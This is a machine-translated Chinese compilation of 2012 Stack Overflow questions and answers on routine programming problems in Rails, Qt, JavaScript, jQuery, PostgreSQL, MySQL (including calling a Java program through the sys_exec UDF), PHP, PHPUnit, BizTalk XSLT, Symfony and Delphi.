/usr/bin/ruby -> /etc/alternatives/ruby 
/etc/alternatives/ruby -> /usr/bin/ruby1.9.1

ruby -v
ruby 1.9.1p378 (2010-01-10 revision 26273) [x86_64-linux] 
```

任何想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-18T08:55:51.213

您是否看过这个问题的提示：[Rails application doesn't work with apache2 and Passenger](https://stackoverflow.com/questions/9980733/rails-application-doesnt-work-with-apache2-and-passenger)？（它看起来像相同类型的错误）。一个人安装了几个版本的 Ruby，这导致了问题。

希望它会有所帮助。

# ruby-on-rails - 基于几个模型的 Rails 3.2 报告

> ID：12460778
> 
> 赞同：2
> 
> 时间：2012-09-17T13:54:23.693
> 
> 标签：ruby-on-rails, rest, user-interface, report, reporting

由于这是一个 Ruby on Rails 特定问题，我希望它属于这里。我正在为一家仓储公司设计一个库存系统，该公司有多种模型，如产品、客户、发货、收据等。

我想有一个单独的报告部分，允许客户根据这些模型生成报告，其中几个报告来自许多不同的模型。菜单如下所示：

```
Generate Reports ->
    Shipment Report
    Receipts Report
    Client Report
    Product Report
    Inventory Report
    Billing Report (generates report based off
                    calculations between incoming
                    receipts and outgoing shipments) 
```

我的问题是如何以 RESTful 方式构建报表系统。这是否包括简单地生成一个带有视图的报告控制器对应的控制器方法？你会生成一个报告模型吗？你将如何解决这个问题？

编辑：我必须补充一点，报告将使用自定义日期范围等动态生成。每个报告都需要表格。我的想法是，如果我使用一个控制器，视图文件夹可能会变大。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-23T08:13:04.450

使每个报告都有自己的资源（控制器），它只需要 new 和 create 操作。

为每个报告创建一个新的模型类。

为用于生成报告的每个表单创建一个类。这是封装表单所需的任何数据的好地方。它还将用于存储表单的输入。

这是一个例子：

```
Class ClientReportController < ..

  Def new
    @form = ClientReportForm.new 
  End

  Def create
   @form = ClientReportForm.new params[:form]
   @report = ClientReport.new @form
  End
End 
```

# c++ - QLocalSocket - 如何删除读数

> ID：12460779
> 
> 赞同：0
> 
> 时间：2012-09-17T13:54:25.487
> 
> 标签：c++, qt

我正在使用 a`QLocalSocket`将`Measurement`结构从服务器程序每隔一段时间传输到客户端。

我设置了块，`QDataStream`然后：

```
out.writeRawData(data, sizeof(Measurement));
out.device()->reset(); 
```

然后对于每个注册的客户：

```
clients_.at(i)->write(block);
clients_.at(i)->flush(); 
```

然后在信号的另一端`readyRead()`：

```
in.readRawData((char *) data, sizeof(Measurement)); 
```

我想要发生的是，如果客户端在发送测量值时尚未准备好接收，它将跳过读数。目前我得到：

```
send 3
read 3
send 4
send 5
read 4 
```

我怎样才能得到：

```
send 3
read 3
send 4
send 5
read 5 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-18T08:36:29.320

如果服务器已将某些内容写入管道（并`flush()`在顶部 ed），则客户端只需将其从管道中读取出来，以便能够访问后续消息。如果你不想对消息做任何事情，你可以简单地`in.skipRawData(sizeof(Measurement))`在客户端。但是，如果您想避免客户端获取任何数据，那么您必须完全阻止服务器发送任何数据。所以某种**拥塞控制**。在我的脑海中，我会让客户端发出类似`messageAcknowledgeReadyForNext()`or的信号，`notReadyToReceive()`并且在`clients_`迭代周期中，让我们跳过那些发送*未准备好的*客户端（以及那些不被称为发送至少一个*确认*的客户端）。

# javascript - 获取地图中心坐标

> ID：12460786
> 
> 赞同：0
> 
> 时间：2012-09-17T13:54:38.060
> 
> 标签：javascript, map, bing-maps, virtual-earth

我正在使用 VEMap API。我有地图左上角和右下角（边界框）的纬度和经度。我想得到中心点。有什么简单的方法可以做到这一点？我在谷歌上搜索找不到解决方案。

我在想的是，如果我可以使用上面提到的两点定义地图，那么我可以很容易地得到中心：

```
// JavaScript code snippet
var center = map.GetCenter();
var lat = center.Latitude;
var lng = center.Longitude; 
```

有没有办法调用地图对象的构造函数并传递我拥有的两个坐标？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T17:00:17.447

简单的答案是添加纬度并除以二，对经度做同样的事情。它们是直线。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-01T19:54:33.850

`VEMap.GetCenter`地图构建后有什么原因不能使用该方法吗？这样无论从哪个角度来看都是正确的。如果您使用的是默认构造函数，则可以传入边界框，然后在实例化对象后调用 getmap 。

[http://msdn.microsoft.com/en-us/library/bb412539.aspx](http://msdn.microsoft.com/en-us/library/bb412539.aspx)

# jquery - 如何让一个按钮在 jQuery 中触发多个操作？

> ID：12460789
> 
> 赞同：1
> 
> 时间：2012-09-17T13:54:48.857
> 
> 标签：jquery, button, action

我试图让这个按钮在不同时间启动多个操作。我想让公共汽车滑入，然后让消息在电话上淡入。

[http://webapps.easy2.com/ce/ext1104/messages/iris_messages.html](http://webapps.easy2.com/ce/ext1104/messages/iris_messages.html)

我是一个视觉学习者，所以例子会有所帮助，谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T14:00:17.030

[http://api.jquery.com/delay/](http://api.jquery.com/delay/)

$('#ID').action1().delay(800).action2();

数字是毫秒。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T14:01:05.207

您想要的技巧是，在您响应点击之后，您需要在下一次点击之前附加一个新的事件响应。您可以通过以下[代码](http://jsfiddle.net/FSWh5/1/)执行此操作...

HTML

```
<button id="multibutton">Click Me</button>​ 
```

JavaScript

```
$('#multibutton').on('click', function() {
    alert("This is the first alert!");

    // Setup for the second click.
    $(this).off('click');
    $(this).on('click', function() {
        alert("This is the second alert!");
    });
}); 
```

这样，一旦第一个事件完成，您将附加下一个事件。而且，当然，如果您有许多不同的事件（而不仅仅是两个），您可以创建一个规则系统，在该系统中您可以在单击按钮的过程中继续移动到下一个规则。

# javascript - Javascript倒计时不起作用

> ID：12460791
> 
> 赞同：-4
> 
> 时间：2012-09-17T13:54:49.980
> 
> 标签：javascript

每次我重新加载此页面[http://prince27.bplaced.net/Prince27-Website/html/slider_true.html](http://prince27.bplaced.net/Prince27-Website/html/slider_true.html)时，倒计时都会重新开始。我做错了什么？

我已将 endDate 设置为 2012 年 9 月 20 日，并计算了 now 和 endDate 之间的毫秒数。

```
var today = new Date();

var endDate = new Date("20/09/2012"); //set the date you want timer to end
var diffMs = (280800000); // milliseconds between now & endDate
var diffDays = Math.round(diffMs / 86400000); // days
var diffHrs = Math.round((diffMs % 86400000) / 3600000); // hours
var diffMins = Math.round(((diffMs % 86400000) % 3600000) / 60000); // minutes
var diffSecs = Math.floor((((diffMs % 86400000) % 3600000) % 60000) / 1000); 
```

完整的脚本[文件](http://prince27.bplaced.net/Prince27-Website/html/js/countdown.engine.js)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-17T13:58:32.977

您已经硬编码了差异：

```
var diffMs = (280800000); // milliseconds between now & endDate 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-17T13:59:13.867

检查你的代码，你有硬编码的价值`diffMs`，你从不使用`today`

```
var today = new Date();

var endDate = new Date("20/09/2012"); //set the date you want timer to end
var diffMs = (280800000); // milliseconds between now & endDate 
```

# c# - 使用枚举从后端到前端（javascript）的错误处理，我在哪里放置翻译？

> ID：12460793
> 
> 赞同：1
> 
> 时间：2012-09-17T13:54:53.737
> 
> 标签：c#, javascript, error-handling, translation

我正在修补一个错误系统，我使用枚举来识别错误。枚举包含在服务器端并转换为 JS 对象，但我不知道在哪里保存我的错误消息。

错误枚举

```
public enum MyError
{
    InvalidThingFormat = 1001,
    AllowedThingsExceeded = 1002
} 
```

生成的 JavaScript“枚举”

```
var MyError= {InvalidThingFormat :1001,AllowedThingsExceeded:1002}; 
```

并做检查

```
switch(data.error) {
    case MyError.InvalidThingFormat:
        alert("Format validation failed");
        break;
    // etc.
} 
```

到目前为止，我喜欢这种感觉，但我不喜欢硬编码的错误消息；那么我将把人类可读错误消息的本地化/国际化放在哪里呢？

是否还应该有我在 JS 中推出的后端翻译集，或者翻译是否应该只在 JS 端，由其他方法处理？代码会是什么样子；`Error.GetMessage(MyError.AllowedThingsExceeded)`?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:27:20.107

您将有几个 javascript 文件，每个文件都以其本地化命名。IE：

zh-cn.js：

```
var ErrorMessages = {
    "1001" : "Invalid thing",
    "1002" : "Too many things."
}; 
```

es-mx.js：（注意，我实际上不懂西班牙语）

```
var ErrorMessages = {
    "1001" : "Cosa no válido",
    "1002" : "Demasiadas cosas"
}; 
```

等等等等。

因此，您将包含 en-us.js 作为默认值，然后包含任何适当的本地化。

然后你可以像这样使用它：

```
 var errMsg = ErrorMessages[MyError.InvalidThingFormat]; 
```

或者

```
 var errMsg = ErrorMessages["1001"]; 
```

# mysql - 在 MySQL 中管理完整的 SQL 事务

> ID：12460796
> 
> 赞同：1
> 
> 时间：2012-09-17T13:55:06.347
> 
> 标签：mysql, database

参考这个，[http://docs.oracle.com/cd/B19306_01/server.102/b14220/transact.htm](http://docs.oracle.com/cd/B19306_01/server.102/b14220/transact.htm)

如何将事务管理到 MySQL 数据库中。

我担心的是，我有一个应用程序正在编写一些类似于给定链接的查询以完成完整的交易。我想确保它始终为最终保存写入正确和完整的事务，并且在电源故障或其他一些情况下不会将不完整的事务写入 SQL 以确保事务的正确性。

只想知道如何将它实现到 MySQL 数据库中。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T13:57:45.670

首先，确保您使用的是事务性存储引擎，例如 InnoDB。接下来，确保您了解[导致隐式提交的语句](http://dev.mysql.com/doc/refman/5.0/en/implicit-commit.html)。

[阅读有关交易的文档](http://dev.mysql.com/doc/refman/5.0/en/sql-syntax-transactions.html)

# postgresql - 按与“现在”的绝对距离对时间戳（包括未来）进行排序

> ID：12460797
> 
> 赞同：8
> 
> 时间：2012-09-17T13:55:13.320
> 
> 标签：postgresql, datetime, sql-order-by, postgresql-8.2

有了一个`date`字段，我可以做到[这一点](https://stackoverflow.com/a/12402084/96588)：

```
ORDER BY ABS(expiry - CURRENT_DATE) 
```

使用一个`timestamp`字段，我收到以下错误：

> 函数 abs(interval) 不存在

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-09-17T13:58:45.800

为此目的使用[now() 或 CURRENT_TIMESTAMP](http://www.postgresql.org/docs/current/interactive/functions-datetime.html#FUNCTIONS-DATETIME-CURRENT)。

您的查询结果不同的原因是：

当您减去 type 的两个值时`date`，结果为 an**`integer`**并且`abs()`适用。
当您减去两个类型的值`timestamp`（或只有一个是 a `timestamp`）时，结果是 a **`interval`**，并且`abs()`不适用。你可以用一个`CASE`表达式代替：

```
ORDER BY CASE WHEN expiry > now() THEN expiry - now() ELSE now() - expiry END 
```

或者你可以像@Craig 已经展示的那样从结果中提取[`extract()`](http://www.postgresql.org/docs/current/interactive/functions-datetime.html#FUNCTIONS-DATETIME-EXTRACT)unix 。我引用：“对于间隔值，间隔中的总秒数”。然后你可以再次使用：`epoch``interval``abs()`

```
ORDER BY abs(extract(epoch from (expiry - now()))); 
```

[`age()`](http://www.postgresql.org/docs/9.1/interactive/functions-datetime.html#FUNCTIONS-DATETIME-TABLE)通过将天数总结为月和年以获得更大的间隔，只会为间隔添加更人类可读的表示。但这不是重点：该值仅用于排序。

由于您的列是时间戳类型，您应该使用`CURRENT_TIMESTAMP`(or `now()`) 而不是 `CURRENT_DATE`，否则您将得到不准确的结果（甚至“今天”不正确）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T13:58:11.340

与之比较`current_timestamp`

```
SELECT the_timestamp > current_timestamp; 
```

比较它们时，该`age`功能可能是您想要的：

```
SELECT age(the_timestamp); 
```

例如：

```
regress=# SELECT age(TIMESTAMP '2012-01-01 00:00:00');
      age       
----------------
 8 mons 17 days
(1 row) 
```

如果您想要绝对距离，请使用：

```
SELECT abs( extract(epoch from age(the_timestamp)) ); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-17T14:06:34.273

这有效（并给出正确的排序）：

```
ABS(EXTRACT(DAY FROM expiry - CURRENT_TIMESTAMP)) 
```

不幸的是，正如 Erwin Brandstetter 所指出的，它将排序的粒度降低到一整天。

# modx-revolution - 迁移后无法更改资源模板

> ID：12460806
> 
> 赞同：0
> 
> 时间：2012-09-17T13:55:42.540
> 
> 标签：modx-revolution

迁移到新服务器后，我发现无法更改模板：页面已重新加载，但模板保持不变。

迁移后我是否忘记做某事？

有什么建议么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-23T19:54:31.060

发生这种情况的原因可能很少，但最常见和最有可能发生的是 MODX 解释的时间与服务器设置的时间的差异。这意味着无论何时编辑文档，MODX 都会缓存其内容并通过时间戳区分这些缓存文件中的每一个。重新加载后，MODX 尝试检索时间戳并进行比较，如果失败，它将表单内容（包括模板设置）跳转到以前的设置。

解决方案是从服务器配置中获取 date.timezone 设置并将其粘贴到 MODX 管理器设置中的 date_time 设置中，以使它们相等。这应该可以立即解决问题，但请记住可能需要缓存清理（甚至手动）。

# mysql - MySQL UDF sys_exec

> ID：12460809
> 
> 赞同：2
> 
> 时间：2012-09-17T13:55:49.933
> 
> 标签：mysql, mysql-udf

我正在使用 MySQL UDF 函数`sys_exec`在 MySQL 的触发器中调用 Java 程序。您能否向我提供有关如何将参数传递给`sys_exec`它以便调用 Java 程序的信息？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T14:16:53.207

您可以使用此[链接来使用 sys_exec 功能](http://www.mysqludf.org/lib_mysqludf_sys/)。它说，

> sys_exec sys_exec 接受一个命令字符串参数并执行它。句法
> 
> sys_exec(arg1) 参数和返回值
> 
> arg1 ：对当前操作系统或执行环境有效的命令字符串。返回已执行进程返回的（整数）退出代码。安装
> 
> 将共享库二进制文件放在适当的位置。以 root 或其他具有足够权限的用户身份登录 mysql，然后选择任何数据库。然后，使用以下 DDL 语句创建函数： CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so'; 该功能将在所有数据库中全局可用。卸载函数，运行以下语句： DROP FUNCTION sys_exec;

要执行 Java 程序，您应该将 arg1 填写为`"java <absolute path to precompiled program to run>"`.

注意：java的路径应该事先配置好。

希望能帮助到你...

# javascript - Chrome 中的 null responseXML.xml 值

> ID：12460813
> 
> 赞同：0
> 
> 时间：2012-09-17T13:56:01.617
> 
> 标签：javascript, asp-classic, xmlhttprequest

A有以下问题。我的代码将 HTTP 请求发送到 ASP 处理程序：

```
var xmlRequest = !window.XMLHttpRequest ? new ActiveXObject('Microsoft.XMLHTTP') :      new XMLHttpRequest; 
xmlRequest.open("GET", "Handler.ashx?value25="+$('#joKod').val()+"&operType=3");
xmlRequest.setRequestHeader('Content-Type', 'text/xml');
xmlRequest.onreadystatechange = function()
{
    if (xmlRequest.readyState == 4)
    {
       if (xmlRequest.status == 200)
       {   
          alert(xmlRequest.responseXML.xml);       
       }
    }
}   
xmlRequest.setRequestHeader("Content-Type", "text/xml"); 
xmlRequest.send('xml'); 
```

我的处理程序创建 XML 答案

```
XmlDocument xd=Scoring.CheckLinkFirma(okpo);
resp.Clear();
resp.ContentType = "text/xml";
xd.Save(resp.Output); 
```

并将其发回：

```
<?xml version="1.0" encoding="utf-8"?>
<Root>
   <jo status="client">abc</jo>
   <jo status="client">dfh</jo>
</Root> 
```

在 Exlorer responseXML.xml 中具有价值，但 Chrome 和 FF 它是未定义的？？？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:12:11.080

因为那是 IE 唯一的属性。如果你想得到一个 XML，你可以这样做：

```
function XMLToString(oXML)
{   
 if (window.XMLHttpRequest) {}//Standards First
 else if (window.ActiveXObject) {return oXML.xml;}//Proprietary Second
 else {return (new XMLSerializer()).serializeToString(oXML);}//other browsers
}
alert(XMLToString(xmlRequest.responseXML)) 
```

或者您可以尝试从中获取 xml 文本`xmlRequest.responseText`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-14T10:31:26.887

我在 jQuery 中找到了答案。希望它会帮助某人

```
$.ajax
({    
    type: "GET",
    url: "Handler.ashx?value25="+$('#joKod').val()+"&operType=3", 
    dataType: "text",
    cache: true,              
    success: function(xml)
    {             
         if (xml) 
         {
            var myXml = $($.parseXML(xml)).find('Root');    
         }
    }
 }); 
```

# javascript - 我的 WP 应用程序具有不受我控制的外部依赖项，如何在不重新提交到市场的情况下解决问题？

> ID：12460814
> 
> 赞同：1
> 
> 时间：2012-09-17T13:56:00.773
> 
> 标签：javascript, windows-phone-7, xpath, windows-phone

我的应用程序中有一堆外部依赖项（XML、HTML、Web 服务等）。

这些可以在没有通知的情况下更改。如何在不让所有流量通过我的服务器并且不等待应用程序获得市场认证的情况下让自己修复它们？

[]

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T21:57:07.640

您可以在 SiteApps.com 上发布您的应用程序。顺便说一句，他们将您的文件保存在他们的 CDN 中，并且只有在您以编程方式更新时才会更新。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T13:56:00.773

我写了一系列关于如何通过使用 XPath 和 Javascript 来自定义您的应用程序并允许您在不经过重新认证的情况下修复/更改应用程序中的元素来准确执行此操作的博客文章。

您可以查看该系列的第一篇文章并从那里获取。

[http://socialeboladev.wordpress.com/2012/09/03/change-resilient-windows-phone-apps-2/](http://socialeboladev.wordpress.com/2012/09/03/change-resilient-windows-phone-apps-2/)

# php - 为什么这个 PHPUnit 比较是错误的？( .. $mock->with($this->identicalTo($foo) )

> ID：12460815
> 
> 赞同：0
> 
> 时间：2012-09-17T13:56:03.663
> 
> 标签：php, unit-testing, testing, phpunit

我对 PhpUnit 有疑问。我想使用`isIdentical`PHPUnit 的方法来确保以特定对象作为参数调用方法。给定的是一个带有“setBar”方法的模拟对象：

```
 $bar = new Bar();
    $someMock
        ->expects($this->any())
        ->method('setBar')
        ->with($this->identicalTo($bar));

    $someMock->setBar($bar); 
```

这当然只是一个例子。它应该工作，但它没有。为了获得一些提示，我在方法中编写了一些回显代码`PHPUnit_Framework_Constraint_IsIdentical`：

```
public function evaluate($other, $description = '', $returnResult = FALSE)
{
    //...
    echo "\n";
    echo spl_object_hash($other) . "/". spl_object_hash($this->value). " - ". get_class($this->value) ."/". get_class($other);
    echo " ->> ";  
    var_dump($other === $this->value);
} 
```

的对象哈希`$other`不**一样**（`$this->value`而哈希`$this->value`实际上是正确的）

**与此同时，我在这里找到了这个错误的原因。这是 PHPUnit 的问题。对象被 PHPUnit 克隆。我留下这个问题如果有人知道这个问题的好解决方法。**

[https://github.com/sebastianbergmann/phpunit-mock-objects/issues/41](https://github.com/sebastianbergmann/phpunit-mock-objects/issues/41)

# algorithm - 解决算法如何适用于命题逻辑？

> ID：12460818
> 
> 赞同：9
> 
> 时间：2012-09-17T13:56:07.250
> 
> 标签：algorithm, logic, artificial-intelligence

我一直无法理解命题逻辑中的解析规则是什么。决议是否只是陈述了一些规则，通过这些规则可以扩展句子并以另一种形式书写？
以下是命题逻辑的简单解析算法。该函数返回通过解析它的 2 输入获得的所有可能子句的集合。我无法理解算法的工作原理，有人可以向我解释一下吗？

```
 function PL-RESOLUTION(KB,α) returns true or false
     inputs: KB, the knowledge base, a sentence α in propositional logic, the query, a
             sentence in propositional logic 
     clauses <--- the set of clauses in the CNF representation of KB ∧ ¬α
     new <--- {}
     loop do
        for each Ci, Cj in clauses do
            resolvents <----- PL-RESOLVE(Ci, Cj)
            if resolvents contains the empty clause then return true
            new <--- new ∪ resolvents
        if new ⊆ clauses then return false
        clauses <---- clauses  ∪ new 
```

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-09-17T15:53:19.723

这是一个完整的讨论主题，但我将尝试向您解释一个简单的示例。

您的算法的输入是**KB** - 一组执行解析的规则。很容易理解为一组事实，例如：

1.  苹果是红色的
2.  *If* smth is red *Then* this smth is sweet

我们引入两个谓词`R(x)`- ( `x` *is red* ) 和`S(x)`- ( `x` *is sweet* )。比我们可以用正式语言写下我们的事实：

1.  `R('apple')`
2.  `R(X) -> S(X)`

我们可以用第二个事实代替`¬R v S`有资格获得解决规则。

程序中的计算解析步骤删除了两个相反的事实：

示例： 1) `a & ¬a -> empty`。2)`a('b') & ¬a(x) v s(x) -> S('b')`

**请注意**，在第二个示例中，变量`x`替换为实际值`'b'`。

我们的程序的目标是确定句子**apple is sweet**是否正确。我们也用正式语言写这句话 as`S('apple')`并以倒置状态询问。那么问题的正式定义是：

*   **第 1 条**=`R('apple')`
*   **第 2 条**=`¬R(X) v S(X)`
*   **目标？**=`¬S('apple')`

算法工作如下：

1.  以条款 c1 和 c2
2.  计算 c1 和 c2 的解析器给出新的子句 c3 = `S('apple')`
3.  计算 c3 的解决方案，目标给我们一个空集。

这意味着我们的句子是正确的。如果你不能用这样的分辨率得到空集，这意味着句子是错误的（但在实际应用中的大多数情况下，它缺乏 KB 事实）。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-18T04:33:28.040

考虑子句 X 和 Y，其中 X = {a, x1, x2, ..., xm} 和 Y = {~a, y1, y2, ..., yn}，其中 a 是一个变量，~a 是它的变量否定，而 xi 和 yi 是文字（即，可能否定的变量）。

X 的解释是命题 (a \/ x1 \/ x2 \/ ... \/ xm)——也就是说，假设 X 为真，至少 a 或 xi 之一必须为真。对于 Y 也是如此。

我们假设 X 和 Y 为真。

我们还知道 (a \/ ~a) 始终为真，无论 a 的值如何。

如果 ~a 为真，则 a 为假，所以 ~a /\ X => {x1, x2, ..., xm}。

如果 a 为真，则 ~a 为假。在这种情况下 a /\ Y => {y1, y2, ..., yn}。

因此，我们知道 {x1, x2, ..., xm, y1, y2, ..., yn} 必须为真，假设 X 和 Y 为真。注意 new 子句没有引用变量 a。

这种扣除被称为决议。

这在基于分辨率的定理证明器中如何工作？很简单：我们使用反证法。也就是说，我们首先将我们的“事实”变成从句，并添加与我们的“目标”否定相对应的从句。那么，如果我们最终可以解决空子句 {}，我们将遇到矛盾，因为空子句等同于虚假。因为事实是给定的，这意味着我们否定的目标一定是错误的，因此（未否定的）目标一定是真的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-21T20:30:09.457

解析是用于证明在谓词逻辑中可表达的论证是正确的
解析导致驳斥命题逻辑中句子的**定理证明技术的过程。**
决议**通过反驳提供证明**。即为了证明它是有效的，解决方法试图证明该语句的否定与已知的语句 算法**产生矛盾**： 1）。将公理的所有命题转换为子句形式 2)。否定命题并将结果转换为子句形式 3）解决它们 4）如果解决者是空子句，则发现矛盾

# php - 将单独的网址编入索引的自定义 Facebook 共享代码是什么

> ID：12460823
> 
> 赞同：0
> 
> 时间：2012-09-17T13:56:28.983
> 
> 标签：php, facebook

我正在使用 facebook 共享代码，但不知道如何自定义 url 部分，以便应该共享该 url 页面上的用户而不是默认 url。

我当前的代码就像

```
 <a onclick="window.open('http://www.facebook.com/sharer/sharer.php/? 
 u=mycarhelpline.com', 'newWindow', 'width=600, height=400'); return false;" 
 href="http://www.facebook.com/sharer/sharer.php/?u=mycarhelpline.com" target="_blank" 
 rel="nofollow"> 
```

我需要自定义线路

```
?u=mycarhelpline.com 
```

使用 php 代码，以便用户访问的 url 应该进入共享窗口而不是默认主页。

（知道共享选项已被弃用，但共享对我有用 - 寻求帮助以自定义共享 url 的代码

谢谢

**已编辑**

嗨，已经输入了修改后的代码，我知道我在做一些错误 - 请帮助 n 建议纠正

```
 <?php
   $server_name = 'mycarhelpline.com';
   $current_path = $_SERVER['REQUEST_URI'];
   $sharerpath = 'http://www.facebook.com/sharer/sharer.php/?u='.$server_name  .'/'.$current_path;
    ?>

   <a onclick="window.open('http://www.facebook.com/sharer/sharer.php/?u='.$sharerpath', 'newWindow', 'width=600, height=400'); return false;" 
   href="http://www.facebook.com/sharer/sharer.php/?u='.$sharerpath''" target="_blank" 
   rel="nofollow"><img src="/templates/mycar_home/images/facebook.png" alt="Share on Facebook" /></a> 
```

现在，当我把 ?> 放在标签之后，它显示服务器错误并且不显示页面并且放在 http://www.facebook.com/sharer/sharer.php/?u='.$sharerpath 之前

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:04:38.003

如果我理解正确，您希望共享插件简单地共享用户所在的当前页面。为此，您必须自定义插件。每次将共享代码放在页面上时，您都必须指定用户所在的页面。

您可以`$_SERVER`为此使用变量中的参数。您已经知道服务器名称，那么您就有了`REQUEST_URI`为访问此页面而提供的 URI。因此，如果您将它们结合起来，您应该会到达每个页面的最终 URL。

```
$server_name = 'mycarhelpline.com';
$current_path = $_SERVER['REQUEST_URI'];
$sharerPath = 'http://www.facebook.com/sharer/sharer.php/?u='.$server_name .'/'.$current_path; 
```

参考 -

*   [`$_SERVER`](http://php.net/manual/en/reserved.variables.server.php)

# xml - 将非分层数据映射到分层数据

> ID：12460830
> 
> 赞同：2
> 
> 时间：2012-09-17T13:56:45.223
> 
> 标签：xml, map, mapping, biztalk

想象一下，我有以下需要映射的 xml 文件。

**资源**

```
<Persons>
    <Person>
        <Id>2</Id>
        <ParentId>3</ParentId>
        <Name>Some dude</Name>
    </Person>
    <Person>
        <Id>3</Id>
        <ParentId></ParentId>
        <Name>Some dude2</Name>
    </Person>
</Persons> 
```

**目的地**

```
<Persons>
    <Person>
        <Name>Some dude</Name>
        <Parent>
            <Name>Some dude2</Name>
        </Parent>
    </Person>
</Persons> 
```

现在，我应该如何将正确的父母与 biztalk 地图中的人对应起来？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:24:46.697

如果您将 Bi​​zTalk BTM 映射更改为[直接使用 xslt](https://stackoverflow.com/questions/3716608/biztalk-2010-mapping-an-xsd-with-a-lot-of-elements-with-the-same-name/3718014#3718014)而不是可视蜘蛛网，然后应用以下 xslt（显然 BizTalk 通常也需要命名空间）。

```
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:output method="xml" indent="yes"/>
    <xsl:template match="Persons">
        <Persons>
            <xsl:apply-templates select="Person[normalize-space(ParentId/text()) != '']" />
        </Persons>
    </xsl:template>

    <xsl:template match="Person">
        <Person>
            <Name>
                <xsl:value-of select="Name/text()"/>
            </Name>
            <Parent>
                <Name>
                    <xsl:variable name="parentId" select="ParentId/text()" />
                    <xsl:value-of select="/Persons/Person[Id=$parentId]/Name/text()" />
                </Name>
            </Parent>
        </Person>
    </xsl:template>
</xsl:stylesheet> 
```

如果您还想包括没有父母的人，请将第一个更改`apply-templates`为：

```
<xsl:apply-templates select="Person" /> 
```

# php - Unable to show data from ajax in HTML table

> ID：12460834
> 
> 赞同：0
> 
> 时间：2012-09-17T13:56:53.133
> 
> 标签：php, html, css, ajax

I am making an ajax call on click of anchor tag : There i have a number of arrays as output . But i am unable to display those arrays in an HTML table . Please suggest how can i achieve this .

```
function getdetail(cid)
{
var cid = cid;
var xmlhttp = new XMLHttpRequest();
var url = "c_detail.php";
var params = "cid="+cid;

xmlhttp.onreadystatechange=function()
  {
    if (xmlhttp.readyState==4 && xmlhttp.status==200)
        {               
            document.getElementById('cdetail').innerHTML = xmlhttp.responseText;        
        }
  }
xmlhttp.open("GET",url+"?"+params,true);
xmlhttp.send();
 }

My array output looks like this : 

Array ( [0] => Array ( [id] => 5088 [start] => first [end] => last [ad_start] =>ad_first [ad_end] => ad_last [cid] => 79 [car] => Dialog ) ) 
```

Of-course this shows data as list of arrays without any formatting . I want to display it as HTML table Any help will be appreciated !!! Thanks in advance

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T14:13:57.653

OK, I advise you to use an existing library like [datatables](http://datatables.net/release-datatables/examples/data_sources/ajax.html), and you have to convert the php array to json data through `json_encode($array)` function.

# symfony - 如何在 symfony 2 路由中处理问号

> ID：12460835
> 
> 赞同：3
> 
> 时间：2012-09-17T13:56:54.423
> 
> 标签：symfony

我使用带有动态源的 jquery ui 自动完成功能：

```
 $( "#shop-id" ).autocomplete({
        source: function(request, response){
            $.ajax({
                type: "GET",
                url: "/app_dev.php/ticket/get_sids/",
                data: {
                    term: request.term
                },
                success: function(data){
                    console.log(data);
                }
            })
        }
    }); 
```

生成的 url 将如下所示：

```
/app_dev.php/ticket/get_sids/?term=22 
```

我如何在 symfony 2 路由中处理它？我尝试了几件事，但问号似乎是瓶颈。

有任何想法吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-17T14:38:04.293

`term=22`是一个查询参数——一个`GET`请求附带的参数。Symfony 在检查路由时不会使用它，所以它会尝试为`/ticket/get_sids/`. 如果你定义了一个处理这个 URL 的控制器，那么你可以得到这样的`term`参数：

```
$term = $request->query->get('term'); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-04T12:12:41.323

您需要定义这样的路线：

```
ajax_ticket_autocomplete_search:
    pattern:  /ticket/get_sids.php
    defaults: { _controller: "YOURBundle:Ticket:ajaxSearchTicket" } 
```

在您的票务控制器中：

```
public function ajaxSearchTicketAction()
    {

        $request = $this->getRequest();
        $term_autocomplete=$request->query->get('term');
    ... 
```

通过这种方式，您可以通过查询字符串访问术语值。

# delphi - 当从 Delphi 7 调用外部 dll 时，TClientDataSet 中缺少字段错误

> ID：12460836
> 
> 赞同：0
> 
> 时间：2012-09-17T13:56:54.973
> 
> 标签：delphi, delphi-7, delphi-xe2, dbexpress, tclientdataset

我在 Delphi XE2 中创建了一个 DLL，它使用 DB Express 和 TClientDataSet 来显示 DB Grid 中的连接结果。有一个简单的功能可以启动/显示导出以供其他应用程序使用的表单。在 FormActivate 上执行查询并填充网格。

当我调用该函数以从单独的 Delphi XE2 应用程序中显示表单时，一切运行正常 - 我找不到任何问题。

但是，当我从单独的 Delphi 7 应用程序调用相同的函数时，我收到一个错误，即 TClientDataSet 无法从连接中找到字段。

